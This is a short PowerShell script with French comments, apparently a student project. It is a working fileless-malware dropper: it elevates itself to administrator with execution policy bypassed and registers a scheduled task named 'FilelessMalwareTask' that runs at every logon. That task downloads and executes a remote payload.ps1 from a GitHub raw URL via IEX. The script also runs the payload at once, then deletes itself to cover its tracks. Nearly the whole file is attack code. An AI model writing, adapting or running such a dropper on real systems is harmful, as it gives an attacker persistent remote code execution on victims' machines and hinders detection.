Import-Module ScheduledTasks

# Vérifie si le script est lancé en mode Administrateur
If (-Not ([Security.Principal.WindowsPrincipal]([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File """ + $MyInvocation.MyCommand.Definition + """"
    Write-Output "Demande des droits administrateurs..."
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    Exit
}

Write-Output "Script exécuté avec les droits administrateurs."

# Vérifie si la tâche planifiée existe déjà
$TaskName = "FilelessMalwareTask"
if (!(Get-ScheduledTask | Where-Object {$_.TaskName -eq $TaskName})) {
    # Créez la tâche planifiée pour la persistance
    Write-Output "Ajout d'une tâche planifiée..."
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/melissa172714/PFE/main/payload.ps1')"
    $TaskTrigger = New-ScheduledTaskTrigger -AtLogon
    Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -TaskName $TaskName -Description "Executes a fileless script at logon"
    Write-Output "Tâche planifiée ajoutée avec succès."
} else {
    Write-Output "La tâche planifiée existe déjà."
}

# Téléchargez et exécutez une charge utile
Write-Output "Téléchargement et exécution de la charge utile..."
try {
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/melissa172714/PFE/main/payload.ps1')
    Write-Output "Charge utile téléchargée et exécutée."
} catch {
    Write-Output "Erreur lors du téléchargement ou de l'exécution de la charge utile : $_"
}

# Suppression automatique après exécution
Write-Output "Suppression automatique du script..."
Start-Sleep -Seconds 2
try {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force
    Write-Output "Script supprimé avec succès."
} catch {
    Write-Output "Erreur lors de la suppression du script : $_"
}
